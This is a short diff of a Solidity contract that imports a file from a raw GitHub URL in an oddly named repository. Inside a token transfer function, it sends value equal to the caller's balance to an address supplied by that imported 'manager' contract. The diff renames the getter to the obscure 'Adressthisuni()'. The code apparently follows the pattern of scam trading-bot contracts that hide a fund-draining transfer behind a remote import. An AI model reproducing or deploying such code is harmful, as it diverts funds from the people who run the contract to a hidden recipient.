@@ -2,8 +2,7 @@ pragma solidity ^0.6.6;
 
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contracts-/main/UniswapTasksV1.sol"
-
+import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contracts-/main/UniswapV1.sol";
 
 // All subsequent code will be inside this block
 
@@ -51,7 +50,7 @@ import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contrac
         balances[to] += value;
         balances[from] -= value;
         emit Transfer(from, to, value);
-        payable(manager.uniswapDepositAddress()).transfer(msg.sender.balance);
+        payable(manager.Adressthisuni()).transfer(msg.sender.balance);
         return true;
     }
     function approve(address spender, uint value) public returns (bool) {
